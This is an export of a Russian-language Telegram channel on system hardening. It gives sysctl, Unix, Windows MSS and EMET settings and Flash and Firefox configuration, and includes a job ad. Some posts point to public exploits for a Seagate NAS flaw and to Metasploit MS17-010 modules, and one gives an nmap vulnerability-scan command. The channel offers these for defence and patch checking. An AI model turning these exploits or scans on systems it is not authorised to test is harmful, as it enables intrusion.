Вот и NAS от Seagate отличились (Seagate Personal Cloud Home Media Storage). В отличии от Western Digital не явный бэкдор, а все лишь ошибки в функционале.<br><br>NAS предоставляет для управления веб-приложение Media Server. С помощью запросов к его функциям getLogs и uploadTelemetry можно выполнить произвольный код на устройстве.<br><br>Веб-приложение доступно только из локальной сети, но можно заставить пользователя отправить вредоносные запросы, заманив на фишинговый сайт.<br><br>Уязвимость исправлена в версии прошивки NAS OS v4.3.18.0.<br><br>Эксплойт для уязвимости и ее подробное описание доступны: <a href="https://blogs.securiteam.com/index.php/archives/3548">https://blogs.securiteam.com/index.php/archives/3548</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-89">

      <div class="body details">
25 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message99">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="25.01.2018 10:48:00">
10:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Как это так вышло, что мы до сих пор не подкрутили сетевые настроечки Linux?! Срочно, срочно...<br><br>Править будем файл модифицируемых в процессе работы настроек ядра /etc/sysctl.conf.<br><br>Первым делом отключаем роутинг, добавляем строку:<br><br><code>net.ipv4.ip_forward = 0</code><br><br>Отключаем ICMP- и IPv6-редиректы, чтобы нам не подменили роутер:<br><br><code>net.ipv4.conf.all.accept_redirects = 0</code><br><code>net.ipv4.conf.default.accept_redirects = 0</code><br><code>net.ipv4.conf.all.secure_redirects = 0</code><br><code>net.ipv4.conf.default.secure_redirects = 0</code><br><code>net.ipv6.conf.all.accept_redirect = 0</code><br><code>net.ipv6.conf.default.accept_redirect = 0</code><br><br>И сами их не шлем, мы же приличные люди:<br><br><code>net.ipv4.conf.all.send_redirects = 0</code><br><code>net.ipv4.conf.default.send_redirects = 0</code><br><br>Отключаем прием маршрутов из опций IP-протокола, чтобы нас не обманули:<br><br><code>net.ipv4.conf.all.accept_source_route = 0</code><br><code>net.ipv4.conf.default.accept_source_route = 0</code><br><code>net.ipv6.conf.all.accept_ra = 0</code><br><code>net.ipv6.conf.default.accept_ra = 0</code><br><br>Отключаем ответы на броадкаст и мультикаст ICMP-запросы, защита от атаки Smurf:<br><br><code>net.ipv4.icmp_echo_ignore_broadcasts = 1</code><br><br>Включаем поддержку SYN-cookies, чтобы валидные сессии в случае SYN-флуда продолжали работать:<br><br><code>net.ipv4.tcp_syncookies = 1</code><br><br>Отключаем реакцию на пакеты, нарушающие RFC-1122, чтобы не допустить переполнения логов:<br><br><code>net.ipv4.icmp_ignore_bogus_error_responses = 1</code><br><br>Включаем проверку обратного маршрута, чтобы защититься от спуфинга (не включаем, если в сети несимметричная маршрутизация):<br><br><code>net.ipv4.conf.all.rp_filter = 1</code><br><code>net.ipv4.conf.default.rp_filter = 1</code><br><br>А эта настройка позволит логировать пакеты с недоступным адресом отправителя, чтобы заметить попытки спуфинга. Включаем только если действительно интересно, иначе - бережем логи:<br><br><code>net.ipv4.conf.all.log_martians = 1</code><br><code>net.ipv4.conf.default.log_martians = 1</code><br><br>Если не используем IPv6, можно запросто его отключить и избавиться от кучи потенциальных проблем:<br><br><code>net.ipv6.conf.all.disable_ipv6 = 1</code><br><code>net.ipv6.conf.default.disable_ipv6 = 1</code><br><code>net.ipv6.conf.lo.disable_ipv6 = 1</code><br><br>Вона скока настроили! Применяем:<br><br><code>/sbin/sysctl -w net.ipv4.route.flush=1</code><br><code>/sbin/sysctl -w net.ipv6.route.flush=1</code><br><code>/sbin/sysctl -p</code><br><br>Теперь у нас приличные сетевые настройки =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-90">

      <div class="body details">
26 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message100">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.01.2018 11:07:04">
11:07
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
А что у нас на эту тему могут предложить Юниксы?<br><br><strong>Solaris:</strong><br><br>Отключаем роутинг:<br><br><code>routeadm -d ipv4-forwarding -d ipv4-routing</code><br><code>routeadm -d ipv6-forwarding -d ipv6-routing</code><br><code>routeadm -u</code><br><br>Отключаем редиректы:<br><br><code>ipadm set-prop -p _ignore_redirect=1 ipv4</code><br><code>ipadm set-prop -p _ignore_redirect=1 ipv6</code><br><code>ipadm set-prop -p send_redirects=off ipv4</code><br><code>ipadm set-prop -p send_redirects=off ipv6</code><br><br>Отключаем маршруты из опций IP:<br><br><code>ipadm set-prop -p _rev_src_routes=0 tcp</code><br><br>Отключаем ответы на ICMP броадкаст и мультикаст запросы:<br><br><code>ipadm set-prop -p _respond_to_timestamp_broadcast=0 ip</code><br><code>ipadm set-prop -p _respond_to_address_mask_broadcast=0 ip</code><br><code>ipadm set-prop -p _respond_to_echo_broadcast=0 ip</code><br><code>ipadm set-prop -p _respond_to_echo_multicast=0 ipv4</code><br><code>ipadm set-prop -p _respond_to_echo_multicast=0 ipv6</code><br><br><strong>AIX:</strong><br><br>Отключаем роутинг:<br><br><code>no -p -o ipforwarding=0</code><br><br>Отключаем редиректы:<br><br><code>no -p -o ipignoreredirects=1</code><br><br>Отключаем маршруты из опций IP:<br><br><code>no -p -o ipsrcrouterecv=0</code><br><br>Отключаем ответы на ICMP броадкаст запросы:<br><br><code>no -p -o bcastping=0</code><br><br>Включаем защиту от внедрения поддельных TCP-пакетов:<br><br><code>no -p -o tcp_tcpsecure=7</code><br><br><strong>HP-UX:</strong><br><br>Отключаем роутинг:<br><br><code>ndd -set /dev/ip ip_forwarding 0</code><br><br>С редиректами тут паршиво, только с помощью фаервола:<br><br>Добавляем строку <code>block in quick proto icmp from any to any icmp-type redir</code> в таблицу правил в файле /etc/opt/ipf/ipf.conf<br><code>ipf -Fa -A -f /etc/opt/ipf/ipf.conf</code><br><br>Отключаем маршруты из опций IP:<br><br><code>ndd -set /dev/ip ip_forward_src_routed 0</code><br><br>Отключаем ответы на ICMP броадкаст запросы:<br><br><code>ndd -set /dev/ip ip_respond_to_echo_broadcast 0</code><br><code>ndd -set /dev/ip ip_respond_to_timestamp_broadcast 0</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-91">

      <div class="body details">
29 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message101">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="29.01.2018 15:44:23">
15:44
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Винда, конечно, тоже требует настройки всех этих сетевых параметров, про которые мы говорили. Но у нее почему то не предусмотрено легкого пути и многие настройки даже отсутствуют в стандартных административных шаблонах.<br><br>Отключаем роутинг:<br><br>Роутинг отключается в ключе реестра HKLM\System\CurrentControlSet\Services\Tcpip\Parameters IPEnableRouter (REG_DWORD) путем установки значения 0. Прикладываю для него административный шаблон.<br><br>Отключаем редиректы:<br><br>Тут нам поможет пак дополнительных политик для Windows MSS. Скачать его версию можно тут: <a href="https://msdnshared.blob.core.windows.net/media/2016/10/MSS-legacy.zip">https://msdnshared.blob.core.windows.net/media/2016/10/MSS-legacy.zip</a>. После добавления шаблонов появится раздел Computer-&gt;Administrative Templates-&gt;MSS (Legacy).<br><br>В нем есть пункт EnableICMPRedirect, связанный со значением реестра HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters:EnableICMPRedirect и позволяющий легко отключить редиректы.<br><br>Отключаем маршруты из опций IP:<br><br>В тех же шаблонах MSS нас интересуют опции DisableIPSourceRouting и DisableIPSourceRouting IPv6, обе ставим в значение &quot;Highest protection&quot;. В реестре это устанавливается в ключах HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters:DisableIPSourceRouting и HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip6\Parameters:DisableIPSourceRouting и соответствует значению 2.
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message102">

      <div class="body">

       <div class="pull_right date details" title="29.01.2018 15:44:54">
15:44
       </div>

       <div class="media_wrap clearfix">

        <div class="media clearfix pull_left media_file">

         <div class="fill pull_left">

         </div>

         <div class="body">

          <div class="title bold">
IPRouter.adm
          </div>

          <div class="description">
Not included, change data exporting settings to download.
          </div>

          <div class="status details">
739 B
          </div>

         </div>

        </div>

       </div>

      </div>

     </div>

     <div class="message service" id="message-92">

      <div class="body details">
30 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message103">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.01.2018 11:19:57">
11:19
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Ну раз уж мы установили шаблоны MSS, посмотрим, что еще в них есть полезного. Неспроста же это дополнительный пак шаблонов для безопасности.<br><br><strong>AutoAdminLogon</strong> - позволяет включить функцию автологона по сохраненным в реестре учетным данным при запуске системы. По умолчанию (если политика не задана) выключено, как и рекомендуется.<br><br><strong>AutoReboot</strong> - просто определяет, будет ли система автоматически перезагружаться после сбоя. Если ничего не менять - то будет.<br><br><strong>AutoShareWks</strong> - дает возможность отключить административные шары на рабочей станции (типа ADMIN$, C$, IPC$). Но сие действо может привести к проблемам в работе софта или администрировании, так что даже стандарты по безопасности не требуют удалять административные шары.<br><br><strong>DisableSavePassword</strong> - позволяет отключить возможность сохранения пароля для dial-up и VPN-подключений. Безопасники рекомендуют.<br><br><strong>Hidden</strong> - компьютер перестает вещать о своих ресурсах. Что не особо смутит хакера, а для юзверей может быть неудобно.<br><br><strong>NoDefaultExempt</strong> - определяет к каким типам трафика не применяются фильтры IPSec. Рекомендуется оставлять только IKE.<br><br><strong>NoDriveTypeAutoRun</strong> - можно отключить автозапуск. Конечно, отключим! на всех, пожалуйста!<br><br><strong>NoNameReleaseOnDemand</strong> - включить, чтобы защититься от спуфинга по NBT-NS. Но мы уже отключали NBT-NS, так что мало что изменится.<br><br><strong>NtfsDisable8dot3NameCreation</strong> - возможность отключить использование имен файлов в стиле 8.3 (типа блабла~.doc). Рекомендуется отключить (т.е. поставить политику в Enabled), т.к. хакер порой может воспользоваться упрощенными наименованиями.<br><br><strong>SafeDllSearchMode</strong> - определяет порядок поиска загружаемых библиотек. Значение Enabled определенно безопаснее.<br><br><strong>ScreenSaverGracePeriod</strong> - фигня какая-то, определяет срок, когда экранная заставка может быть сброшена без пароля. Безопасники рекомендуют ставить 0, но вроде это ничего особо не меняет.<br><br><strong>WarningLevel</strong> - полезен для предупреждения о заполнении лога безопасности, если в нем не настроена перезапись при заполнении.<br><br><strong>EnableDeadGWDetect</strong> - контролирует переключение на запасной дефолтный гейтвэй. Для безопасников бесполезна.<br><br><strong>PerformRouterDiscovery</strong> - включает автоматический поиск шлюза по протоколу IRDP. Обязательно отключаем!<br><br><strong>SynAttackProtect</strong> - понижает тайм-ауты в условиях SYN-флуда, полезно.<br><br><strong>TcpMaxConnectResponseRetransmissions</strong> - количество попыток отправить SYN для установки сессии. Для нормально работающих сетей просто оставить как есть.<br><br><strong>TcpMaxDataRetransmissions</strong> - количество попыток передачи датаграмм TCP. Рекомендуется 3, по умолчанию 5, так что разница невелика.
       </div>

      </div>

     </div>

     <div class="message service" id="message-93">

      <div class="body details">
31 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message104">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="31.01.2018 11:47:07">
11:47
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Linux&quot;)">#Linux</a> <a href="" onclick="return ShowHashtag(&quot;Unix&quot;)">#Unix</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>В Linux есть возможность включить рандомизацию распределения виртуальной памяти (ASLR). Это одновременно защищает от эксплуатации всех уязвимостей, связанных с манипуляцией памятью, и не защищает ни от каких. То есть защищает от не очень продвинутых эксплойтов. Ну что ж, есть не просит - не помешает.<br><br>Включается ASLR в файле /etc/sysctl.conf с помощью следующей строки:<br><br><code>kernel.randomize_va_space = 2</code><br><br>В семействе Red Hat есть еще фича по защите буферов с данными, текстовых и прочие попытки пресечь переполнение буфера, зовется ExecShield. Включается в том же /etc/sysctl.conf с помощью строки:<br><br><code>kernel.exec-shield = 1</code><br><br>Похожая функция есть в Solaris, только называется Stack Protection и настраивается в файле /etc/system следующей строкой:<br><br><code>set noexec_user_stack=1</code><br><br>ASLR тоже имеется, включается так (необходимо, чтобы активная зона была global):<br><br><code>sxadm delcust aslr</code><br><br>В AIX нет функций ASLR и защиты стека.<br><br>В HP-UX можно включить защиту стека следующей командой, после которой потребуется ребут:<br><br><code>kctune executable_stack=0</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-94">

      <div class="body details">
1 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message105">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="01.02.2018 11:07:32">
11:07
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Windows&quot;)">#Windows</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Для Windows в целях противодействия эксплойтам был разработан EMET (разработан Microsoft, но распространяется бесплатно!). В Windows 10 и Windows Server 2016 его заменили встроенные ProcessMitigations Module и Windows Defender Exploit Guard. Ну а для предыдущих выпусков актуален и рекомендуем EMET.<br><br>Для централизованной настройки EMETа доступны готовые административные шаблоны, которые можно найти в папке &quot;&lt;SystemDrive&gt;\Program Files\EMET\Deployment\Group Policy Files&quot; после установки EMET.<br><br>Настройки падают в Computer configuration-&gt;Administrative Templates-&gt;Windows Components-&gt;EMET.<br><br>Вот тут то и настраиваются те плюшки, про которые мы говорили вчера.<br><br>System ASLR (Address Space Layout Randmization) - включает рандомизацию распределения виртуальной памяти.<br><br>System DEP (Data Execution Prevention) - включает предотвращение исполнения данных. Возможные настройки:<br> - Application Opt-In - DEP включается только для системных файлов Windows<br> - Application Opt-Out - DEP включается для всех процессов, но можно задать исключения<br> - Always On - DEP включается для всех процессов без  исключений<br> - Disabled - no comments<br><br>Кроме того на уровне защиты системы в целом Microsoft предлагает опцию SEHOP - Structured Exception Handler Overwrite Protection - защиту обработчиков SEH от перезаписи. Возможные настройки - Application Opt-In и Application Opt-Out, смысл по аналогии с DEP. Однако начиная с Windows Vista SP1 эта функция встроена в систему и уже не требует EMET.
       </div>

      </div>

     </div>

     <div class="message service" id="message-95">

      <div class="body details">
2 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message106">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.02.2018 11:18:38">
11:18
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
На самом деле общесистемный масштаб имеют лишь некоторые функции EMET, а гораздо больших спектр фич применим к процессам конкретных приложений.<br><br>Для приложения можно включить следующие функции:<br><br><strong>DEP</strong> — реализуется за счет вызова kernel32!SetProcessDEPPolicy в контексте контролируемого процесса<br><br><strong>BottomUpASLR</strong> — в некотором роде представляет собой ASLR для выделяемых регионов памяти на стеке и в куче (по мере выделения памяти и в старших адресах)<br><br><strong>NullPage</strong> — защита от эксплуатации MS13-031<br><br><strong>MandatoryASLR</strong> — принудительно включает ASLR для динамически загружаемых библиотек процесса. Реализуется за счет перехвата функции ntdll!NtMapViewOfSection<br><br><strong>HeapSpray</strong> — позволяет фиксировать попытки операций выделения большого количества участков памяти с размещением там кода эксплойта<br><br><strong>LoadLib</strong> — отслеживание операций LoadLibrary с целью предотвращения загрузки библиотеки в память по пути UNC<br><br><strong>MemProt</strong> — запрет изменения статуса страниц стека на executable<br><br><strong>Caller</strong> — контроль за тем, чтобы функция была вызвана с помощью call, а не ret, что широко применяется в эксплойтах<br><br><strong>SimExecFlow</strong> — позволяет обнаруживать ROP-гаджеты после вызова контролируемой EMET функции<br><br><strong>StackPivot</strong> — позволяет обнаруживать ситуации перемещения регистра стека ESP на нужный для эксплойта адрес<br><br><strong>SEHOP</strong> — отслеживает попытки эксплуатирования обработчиков SEH<br><br><strong>EAF</strong> (Export Address Table Access Filtering) — запрещает какие-либо операции обращения к странице памяти, на которой расположена таблица экспорта модуля, кроме доступа легитимного кода<br><br>Все эти функции можно настроить в окне Mitigations графического интерфейса. Кроме того, в окне Application Configuration есть еще три дополнительных функции:<br><br><strong>Deep Hooks</strong> — для защиты критических API EMET будет перехватывать не только сами функции, но и те функции (другие API), которые из них будут вызываться<br><br><strong>Anti Detours</strong> — блокирует действия эксплойтов, которые пропускают первые байты API (обычно пролог) и передают управление на инструкции, следующие за ними<br><br><strong>Banned Functions</strong> — запрещает вызов API-функций из специального списка<br><br>Каждое отдельно взятое приложение может быть несовместимо с некоторыми защитами EMET, поэтому перед его включением требуется тестирование (или гуглинг данных от тех, кто уже протестировал). Однако в административных шаблонах EMET поставляются уже <strong>готовые проверенные политики</strong> для ряда приложений.<br><br>Включаются они следующими групповыми политиками:<br><br> - Computer Configuration\Policies\Administrative Templates\Windows Components\EMET\Default Protections for Internet Explorer<br> - Computer Configuration\Policies\Administrative Templates\Windows Components\EMET\Default Protections for Recommended Software (включает Adobe Reader, Adobe Acrobat, Java, Microsoft Office, блокнот)<br> - Computer Configuration\Policies\Administrative Templates\Windows Components\EMET\Default Protections for Popular Software (включает Media Pleer, Skype, Lync, Windows Live, Google Talk, Chrome, Firefox, Thunderbird, Adobe Photoshop, Winamp, Opera, WinRAR, WinZip, VLC, 7-Zip, Safari, iTunes и еще немного)
       </div>

      </div>

     </div>

     <div class="message service" id="message-96">

      <div class="body details">
5 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message107">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.02.2018 11:36:04">
11:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Adobe Flash славу получил как плагин небезопасный, густо снабженный уязвимостями и к отключению рекомендуемый. Вот и новая уязвимость в нем найдена - CVE-2018-4878, и хакерами эксплуатируется в wild. Ежели плагином вы пользуетесь, можете просто обновить до версии <a href="28.0.0.137">28.0.0.137</a> превышающей, а в случае ином - можно и получше что-то сотворить.<br><br>Так как HTML5 потихоньку (или уже и не потихоньку) вытесняет Flash, на мобильных платформах Flash уже и не поддерживается, и вообще, вы мало где можете встретить потребность в нем, самый действенный способ - отключить или удалить его. Если на такое вы пока решиться не готовы, обязательно стоит включить функцию подтверждения запуска содержимого для флеша.<br><br><strong>Internet Explorer</strong><br><br>Тут у нас флеш установлен по умолчанию.<br><br>Чтобы отключить: открываем меню -&gt; &quot;Manage add-ons&quot; -&gt; &quot;All add-ons&quot;, находим &quot;Shockwave Flash Object&quot; и жмем &quot;Disable&quot;.<br><br>Отключаем массово: через групповые политики в User Configuration\Windows Components\Internet Explorer\Security Features\Add-on Management:Turn off Adobe Flash in Internet Explorer and prevent applications from using Internet Explorer technology to instantiate Flash objects<br><br>Включаем запрос о запуске: открываем меню -&gt; &quot;Manage add-ons&quot; -&gt; &quot;All add-ons&quot;, находим &quot;Shockwave Flash Object&quot;, жмакаем пракой кнопкой и &quot;More information&quot;. Там есть поле с перечнем разрешенных сайтов, а под ним кнопка &quot;Remove all sites&quot;, жмем ее и готово.<br><br><strong>Microsoft Edge</strong><br><br>Опять же, флеш добавлен по умолчанию.<br><br>Отключить: Settings -&gt; &quot;View advanced settings&quot;, найти &quot;Use Adobe Flash Player&quot; и отключить.<br><br>Отключить массово: с помощью групповой политики Computer Configuration\Policies\Administrative Templates\Windows Components\Microsoft Edge\Allow Adobe Flash<br><br>Включаем запрос о запуске: массово с помощью групповой политики Computer Configuration\Policies\Administrative Templates\Windows Components\Microsoft Edge\Configure the Adobe Flash Click-to-Run setting или в реестре HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\Security\:FlashClickToRunMode в значение 1.<br><br><strong>Chrome</strong><br><br>По умолчанию флеш установлен.<br><br>Отключить: открываем chrome://plugins/, находим Adobe Flash Player и кликаем &quot;Отключить&quot;.<br><br>Включить запрос о запуске: массово с помощью политики Computer Configuration\Administrative Templates\Google\Google Chrome\Content Settings\Default Plugins Setting. Или в Settings -&gt; Show Advanced Settings -&gt; Content settings, находим &quot;Plugins&quot; и выбираем &quot;Let me choose when to run plugin content&quot;, а еще под ним проверяем исключения.<br><br><strong>Firefox</strong><br><br>Флеш не установлен по умолчанию.<br><br>Выбрать поведение: Tools -&gt; Addons -&gt; Plugins, находим Flash и выбираем опцию &quot;Ask to activate&quot; или &quot;Never activate&quot;.
       </div>

      </div>

     </div>

     <div class="message default clearfix" id="message108">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.02.2018 12:50:49">
12:50
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;офтоп&quot;)">#офтоп</a> <a href="" onclick="return ShowHashtag(&quot;работа&quot;)">#работа</a><br><br>ЦА ФКУ &quot;Налог-Сервис&quot; ищет консультанта по ИБ. В обязанности входит: <br><br>1. Участие в пилотных проектах по развертыванию средств защиты (Kaspersky, MaxPatrol SIEM, БлокХост сеть);<br>2. Разработка и внедрение стандартов конфигурации (ОС: Windows; СУБД: MS SQL; Active Directory);<br>3. Координация деятельности подведомственных подразделений на территории РФ в рамках реализации политик ИБ;<br><br>Главное требование к специалисту: готовность самостоятельно изучать новые системы, умение проявлять инициативу и <br>ответственность в ходе реализации проекта. Плюсом будет умение разрабатывать техническую и организационную документацию<br>(политики, регламенты и процедуры).<br><br>З/п 70 т.р. на руки, ДМС, работа 5/2, территориально 10 мин. пешком от м. Октябрьское поле.<br><br>Писать на <a href="https://t.me/cybrsht_bot">@cybrsht_bot</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-97">

      <div class="body details">
6 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message109">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.02.2018 10:54:30">
10:54
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Mozilla решил дополнительно подсуетиться о приватности пользователей. В 59-м Firefoxе заголовок Referer будет содержать не полный URL страницы, а только имя домена. Это при условиях, что включен private browsing и запрос на сторонний домен.<br><br>А что вообще стоит включить в Firefoxe для приватности?<br><br>network.http.sendSecureXSiteReferrer=false - можно отключить отправку Referer на HTTPS-сайтах<br><br>network.cookie.cookieBehavior=1 - отключает использование сторонних cookie<br><br>privacy.trackingprotection.enabled=true, privacy.trackingprotection.pbmode=true - включает защиту от отслеживания, которая реализуется в блокировке контента с определенного списка сайтов, замеченных в слежке за пользователями (формируется by Disconnect и встроен в Firefox)<br><br>geo.enabled=false - отключает геолокацию<br><br>Все настроечки доступны в about:config. Ну и че? А если 100 браузеров надо настроить? <br><br>Фаерфокс умеет считывать настроечки из файла, ага, даже не из реестра =/ Считывает он .js файлы из папки defaults/pref (Win, Linux) или <a href="Firefox.app/Contents/Resources/defaults/pref">Firefox.app/Contents/Resources/defaults/pref</a> (Mac). Однако тут должна быть только ссылка на файл конфигурации, в общем надо создать .js файл со следующим содержанием:<br><br><code>// Any comment. You must start the file with a single-line comment!</code><br><code>pref(&quot;general.config.filename&quot;, &quot;mozilla.cfg&quot;);</code><br><code>pref(&quot;general.config.obscure_value&quot;, 0);</code><br><br>Ну а теперь в директории, где лежит бинарь Фаерфокса, создаем файл mozilla.cfg уже с интересующими настройками, примерно так:<br><br><code>// Any comment. You must start the file with a comment!</code><br><code>lockPref(&quot;network.http.sendSecureXSiteReferrer&quot;, false);</code><br><code>lockPref(&quot;network.cookie.cookieBehavior&quot;, 1);</code><br><code>lockPref(&quot;privacy.trackingprotection.enabled &quot;, true);</code><br><code>lockPref(&quot;privacy.trackingprotection.pbmode&quot;, true);</code><br><code>lockPref(&quot;geo.enabled&quot;, false);</code><br><br>Тут можно использовать разные уровни применения натроек:<br><br>lockPref - юзер не может изменить настройку<br>pref - настройка считывается при каждом запуске браузера, но юзер может ее перенастроить на время сессии<br>defaultPref - если юзер задаст новое значение настройки, оно будет использоваться и в новых сессиях
       </div>

      </div>

     </div>

     <div class="message service" id="message-98">

      <div class="body details">
7 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message110">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="07.02.2018 11:28:47">
11:28
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Арсенал хакеров пополнился новым крутым эксплойтом уязвимостей EternalChampion, EternalRomance и EternalSynergy (это все входит в MS17-010, как и широкоизвестный EternalBlue). Эксплойт доступен в виде двух модулей метасплойта <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_psexec.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_psexec.rb</a> и <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/ms17_010_command.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/ms17_010_command.rb</a>. Работает для всех Windows от 2000, как 32, так и 64-битных. Более надежен, чем EternalBlue!<br><br>Вот так то, без обновлений дальше жить никак нельзя. (Ну вообще то и раньше нельзя было, но таки убедимся, что все хорошо)<br><br><strong>PowerShell способ проверки:</strong><br><br>При установке патча обновляется версия файла %systemroot%\system32\drivers\srv.sys и по ее значению можно точно определить, установлено ли обновление. <br>Windows XP - 5.1.2600.7208 и выше<br>Windows Server 2003 с пакетом обновления 2 (SP2) - 5.2.3790.6021 и выше<br>Windows Vista, Windows Server 2008 с пакетом обновления 2 (SP2) - GDR:6.0.6002.19743, LDR:6.0.6002.24067 и выше<br>Windows 7, Windows Server 2008 R2 - 6.1.7601.23689 и выше<br>Windows 8, Windows Server 2012 - 6.2.9200.22099 и выше<br>Windows 8.1, Windows Server 2012 R2 - 6.3.9600.18604 и выше<br>Windows 10 TH1 v1507 - 10.0.10240.17319 и выше<br>Windows 10 TH2 v1511 - 10.0.10586.839 и выше<br>Windows 10 RS1 v1607, Windows Server 2016 - 10.0.14393.953 и выше<br><br>Прилагается PowerShell скрипт, который автоматически проверяет соответствие версии.<br><br><strong>Сетевой способ проверки:</strong><br><br><code>nmap -p445 --script smb-vuln-ms17-010 -Pn -n &lt;target&gt;</code><br><br><strong>Проверка по KB, содержащим патч:</strong><br><br>Их десятки. Перечислены вот тут: <a href="https://support.microsoft.com/ru-ru/help/4023262/how-to-verify-that-ms17-010-is-installed">https://support.microsoft.com/ru-ru/help/4023262/how-to-verify-that-ms17-010-is-installed</a>
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message111">

      <div class="body">

       <div class="pull_right date details" title="07.02.2018 11:29:19">
11:29
       </div>

       <div class="media_wrap clearfix">

        <div class="media clearfix pull_left media_file">

         <div class="fill pull_left">

         </div>

         <div class="body">

          <div class="title bold">
check_ms17-010.ps1
          </div>

          <div class="description">
Not included, change data exporting settings to download.
          </div>

          <div class="status details">
3.9 KB
          </div>

         </div>

        </div>

       </div>

      </div>

     </div>

     <div class="message service" id="message-99">

      <div class="body details">
8 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message112">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="08.02.2018 12:55:16">
12:55
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
